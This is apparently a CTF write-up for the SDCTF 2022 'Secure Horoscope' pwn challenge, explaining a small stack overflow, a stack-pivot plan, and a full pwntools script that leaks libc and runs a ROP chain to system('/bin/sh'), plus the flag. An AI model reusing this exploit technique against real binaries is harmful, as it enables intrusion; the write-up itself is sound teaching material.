---
title: "[Pwn] Secure Horoscope [SDCTF 2022]"
date: 2022-05-09 20:02:00
---

# 0x0 Introduction

Medium

Our horoscope developers have pivoted to a more security-focused approach to predicting the future. You won’t find breaking into this one quite so easy!

Connect
nc sechoroscope.sdc.tf 1337

By green beans

files: [secureHoroscope](secureHoroscope)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vulnerability

In function `dbg.getInfo`, there is `0x8c-0x70 = 0x1c` long buffer over. Although it is very small. It still allow us to do a stack pivot.

1. overwrite rbp to writable memory page, jump `dbg.getInfo` again, but skip callee prologue so that rbp stay the same.
2. write payload (leak libc address and return to dbg.getInfo) to current stack frame
3. double leave ret, point rsp to our payload
4. write ropchain for calling system("/bin/sh") to get shell

# 0x3 Exploit

```
from pwn import *

exe = ELF("secureHoroscope_patched")
exe_rop = ROP(exe)
libc = ELF("libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def log_print(*msg):
    log.info(" ".join(map(str,msg)))

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("sechoroscope.sdc.tf", 1337)
    return r

ret_addr = exe_rop.find_gadget(['ret'])[0]
pop_rdi_ret_addr = exe_rop.find_gadget(['pop rdi', 'ret'])[0]

io = start()
io.sendlineafter(b'feel\n',b"AAAAA")

writable = 0x601900

print(hex(exe.sym["puts"]))
# print(hex(exe.got["puts"]))
input("wait")
io.sendlineafter(b'horoscope\n\n',flat({
    0x70:writable,
    0x70+8:0x004007b9
}))
io.recvuntil(b"business days.\n")

input("wait")
io.send(flat({
    0:[
        writable-0x70 + 0x8*5,# new rbp
        pop_rdi_ret_addr,
        exe.got["puts"],
        exe.sym["puts"],
        0x004007fd, # fflush, leave ret
        writable-0x70 + 0x8*5 +0x8 + 0x70, # rbp
        0x004007cf,
    ],
    0x70:writable-0x70,
    0x70+8:0x0040080d # leave ret
}))
io.recvuntil(b"business days.\n")
libc.address = int.from_bytes(io.recvuntil(b"\n",drop=True),"little") - libc.sym["puts"]
log_print("base libc addr",hex(libc.address))
input("wait")
io.send(flat({
    0:[
        pop_rdi_ret_addr,
        next(libc.search(b"/bin/sh")),
        libc.sym["system"]
    ],

}))
io.interactive()
```

# 0x4 Flag

sdctf{Th0s3_d4rN_P15C3s_g0t_m3}